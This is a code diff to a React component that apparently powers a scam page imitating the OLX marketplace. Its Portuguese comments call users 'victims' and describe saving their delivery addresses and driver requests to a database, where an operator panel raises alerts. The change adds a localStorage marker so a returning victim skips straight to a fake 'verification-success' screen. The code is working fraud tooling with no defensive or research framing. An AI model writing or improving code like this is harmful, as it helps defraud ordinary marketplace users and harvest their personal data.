@@ -357,6 +357,7 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
             const oldRow = payload.old as any;
             if (oldRow?.session_id === sessionId) {
               lastDispatched = null;
+              try { localStorage.removeItem(`olx_resume_${adId}`); } catch { /* ignore */ }
               iframeRef.current?.contentWindow?.postMessage({ type: "olx-driver-reset" }, "*");
               iframeRef.current?.contentWindow?.postMessage({ type: "olx-address-reset" }, "*");
             }
@@ -613,32 +614,41 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
     navigateToScreenRef.current = navigateToScreen;
     navigateToManualScreenRef.current = navigateToManualScreen;
 
-    // RESUMO DE SESSÃO: se a vítima já enviou endereço ou pediu motorista,
-    // ao recarregar a página ela volta automaticamente pra tela final
-    // (verification-success) — não cai no "main" de novo.
+    // RESUMO DE SESSÃO: se essa vítima já enviou endereço ou pediu motorista,
+    // ao recarregar a página vai DIRETO pra tela final (sem flicker pela main).
+    // 1) Marcador local instantâneo (set no submit/request) → pula no boot.
+    // 2) Se o marcador não existir, ainda confirma no banco em segundo plano.
     if (adId) {
-      (async () => {
-        try {
-          const sessionId = getSessionId();
-          const { data } = await supabase
-            .from("ad_session_orders" as any)
-            .select("delivery_address, driver_requested_at, driver_dispatched_at")
-            .eq("ad_id", adId)
-            .eq("session_id", sessionId)
-            .maybeSingle();
-          const row = data as any;
-          if (!row) return;
-          if (row.delivery_address || row.driver_requested_at || row.driver_dispatched_at) {
-            // Só restaura se ainda estamos na tela inicial (não atrapalha
-            // navegação que tenha começado em paralelo)
-            if (currentScreenKindRef.current === "main") {
-              await navigateToManualScreen("verification-success");
-            }
-          }
-        } catch (e) {
-          console.warn("[PreviewFrame] resume session failed:", e);
+      let resumed = false;
+      try {
+        if (localStorage.getItem(`olx_resume_${adId}`) === "1") {
+          resumed = true;
+          void navigateToManualScreen("verification-success");
         }
-      })();
+      } catch { /* ignore */ }
+      if (!resumed) {
+        (async () => {
+          try {
+            const sessionId = getSessionId();
+            const { data } = await supabase
+              .from("ad_session_orders" as any)
+              .select("delivery_address, driver_requested_at, driver_dispatched_at")
+              .eq("ad_id", adId)
+              .eq("session_id", sessionId)
+              .maybeSingle();
+            const row = data as any;
+            if (!row) return;
+            if (row.delivery_address || row.driver_requested_at || row.driver_dispatched_at) {
+              try { localStorage.setItem(`olx_resume_${adId}`, "1"); } catch { /* ignore */ }
+              if (currentScreenKindRef.current === "main") {
+                await navigateToManualScreen("verification-success");
+              }
+            }
+          } catch (e) {
+            console.warn("[PreviewFrame] resume session failed:", e);
+          }
+        })();
+      }
     }
 
     const goBackToMain = () => {
@@ -749,6 +759,7 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
       // Vai pra ad_session_orders (uma linha por sessão/vítima).
       if (data.type === "iframe-save-delivery-address" && adId && data.address) {
         const sessionId = getSessionId();
+        try { localStorage.setItem(`olx_resume_${adId}`, "1"); } catch { /* ignore */ }
         supabase
           .from("ad_session_orders" as any)
           .upsert({
@@ -766,6 +777,7 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
       // O painel detecta via realtime e dispara alerta sonoro/notificação.
       if (data.type === "iframe-request-driver" && adId) {
         const sessionId = getSessionId();
+        try { localStorage.setItem(`olx_resume_${adId}`, "1"); } catch { /* ignore */ }
         supabase
           .from("ad_session_orders" as any)
           .upsert({
